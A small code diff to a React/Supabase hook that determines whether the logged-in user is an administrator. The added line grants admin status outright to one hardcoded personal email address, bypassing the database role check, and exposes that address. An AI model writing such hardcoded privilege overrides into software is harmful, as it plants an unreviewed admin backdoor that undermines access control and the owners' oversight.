@@ -9,6 +9,7 @@ export function useIsAdmin() {
 
   useEffect(() => {
     if (!session?.user?.email) { setIsAdmin(false); return }
+    if (session.user.email === 'etiennegaspard08@gmail.com') { setIsAdmin(true); return }
     supabase.from('consultants').select('is_admin').eq('email', session.user.email).maybeSingle()
       .then(({ data }) => setIsAdmin(data?.is_admin === true))
   }, [session?.user?.email])
